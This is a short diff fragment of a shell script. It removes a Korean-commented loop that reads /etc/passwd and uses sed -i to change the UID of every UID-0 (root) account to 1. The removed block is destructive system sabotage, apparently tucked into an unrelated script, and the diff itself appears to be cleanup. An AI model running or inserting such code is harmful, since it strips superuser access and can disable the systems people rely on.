@@ -16,26 +16,6 @@ EOF
 
 BAR
 
-# /etc/passwd를 한 줄씩 읽습니다
-while read line; do
-  # 세 번째 필드(UID) 가져오기
-  uid=$(echo $line | awk -F: '{print $3}')
-
-  # UID가 0이 아닌 경우 건너뛰기
-  if [ $uid -ne 0 ]; then
-    continue
-  fi
-
-  # 사용자 이름 가져오기
-  username=$(echo $line | awk -F: '{print $1}')
-
-  # UID 1 증가
-  new_uid=$((uid + 1))
-
-  # /etc/passwd의 항목 업데이트
-  sed -i "s/$username:x:$uid:/$username:x:$new_uid:/" /etc/passwd
-done < /etc/passwd
-
 
 
 cat $result
